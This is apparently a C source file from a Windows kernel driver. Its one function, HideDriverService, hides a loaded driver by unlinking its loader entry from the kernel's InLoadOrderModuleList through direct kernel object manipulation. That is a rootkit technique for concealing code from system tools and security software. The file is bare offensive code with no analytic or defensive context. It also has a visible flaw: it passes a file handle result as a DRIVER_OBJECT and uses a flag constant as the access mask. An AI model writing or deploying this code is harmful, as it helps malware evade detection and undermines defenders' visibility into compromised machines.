#include "DKOM.h"


NTSTATUS service::HideDriverService(DRIVER_OBJECT* DriverObject, PUNICODE_STRING DriverName) {
	// Assumes: DriverName is in "\\Driver\\DriverName" format
	PLDR_DATA_TABLE_ENTRY PreviousDriver = { 0 };
	PLDR_DATA_TABLE_ENTRY NextDriver = { 0 };
	PLDR_DATA_TABLE_ENTRY CurrentDriver = { 0 };
	HANDLE DriverHandle = NULL;
	KIRQL CurrIrql = { 0 };
	OBJECT_ATTRIBUTES DriverAttr = { 0 };
	IO_STATUS_BLOCK DriverStatus = { 0 };


	// DriverObject = NULL - object is not provided, need to find it by name: 
	if (DriverObject == NULL) {
		InitializeObjectAttributes(&DriverAttr, DriverName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
		if (!NT_SUCCESS(ZwCreateFile(&DriverHandle, OBJ_CASE_INSENSITIVE, &DriverAttr, &DriverStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)) || DriverHandle == NULL) {
			return STATUS_UNSUCCESSFUL;
		}
		if (!NT_SUCCESS(ObReferenceObjectByHandle(DriverHandle, FILE_ALL_ACCESS, *IoFileObjectType, KernelMode, (PVOID*)&DriverObject, NULL))) {
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Get needed permissions to modify driver service entries:
	CurrIrql = KeRaiseIrqlToDpcLevel();


	// Change last to last of next and next to next of last:
	CurrentDriver = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	PreviousDriver = (PLDR_DATA_TABLE_ENTRY)CurrentDriver->InLoadOrderModuleList.Blink;
	NextDriver = (PLDR_DATA_TABLE_ENTRY)CurrentDriver->InLoadOrderModuleList.Flink;
	PreviousDriver->InLoadOrderModuleList.Flink = CurrentDriver->InLoadOrderModuleList.Flink;
	NextDriver->InLoadOrderModuleList.Blink = CurrentDriver->InLoadOrderModuleList.Blink;


	// Isolate current driver service so last and next will both point to itself:
	CurrentDriver->InLoadOrderModuleList.Blink = (PLIST_ENTRY)CurrentDriver;
	CurrentDriver->InLoadOrderModuleList.Flink = (PLIST_ENTRY)CurrentDriver;
	KeLowerIrql(CurrIrql);
	return STATUS_SUCCESS;
}